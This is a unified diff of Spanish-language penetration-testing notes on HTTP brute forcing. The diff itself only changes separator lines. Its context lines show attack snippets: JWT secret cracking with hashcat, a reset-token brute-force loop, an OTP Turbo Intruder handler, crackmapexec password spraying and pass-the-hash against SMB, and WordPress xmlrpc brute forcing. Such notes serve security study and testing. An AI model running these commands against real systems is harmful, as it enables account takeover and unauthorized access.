@@ -20,7 +20,7 @@ linked:
 ---
 # HTTP Brute Forcing - Tipos Especiales
 
-***
+---
 
 ## JWT Secret Crack
 
@@ -60,7 +60,7 @@ hashcat -a 3 -m 16500 jwt.txt '?a?a?a?a?a?a?a?a'
 hashcat -m 16500 jwt.txt --show
 ```
 
-___
+---
 
 ## Password Reset Token Brute
 
@@ -94,7 +94,7 @@ for code in {000000..999999}; do
 done
 ```
 
-___
+---
 
 ## OTP / 2FA Brute
 
@@ -129,7 +129,7 @@ def handleResponse(req, interesting):
         table.add(req)
 ```
 
-___
+---
 
 ## SSH / RDP / SMB / FTP Brute
 
@@ -172,7 +172,7 @@ crackmapexec smb 10.10.10.0/24 -u admin -p Password123! -d CONTOSO.LOCAL
 crackmapexec smb 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
 ```
 
-___
+---
 
 ## App-Specific (WordPress, Joomla, etc.)
 
@@ -224,4 +224,4 @@ curl -X POST -H "Content-Type: text/xml" --data @xmlrpc.xml https://target/xmlrp
   | grep -B2 'faultCode</name>' | grep -v fault
 ```
 
-***
+---
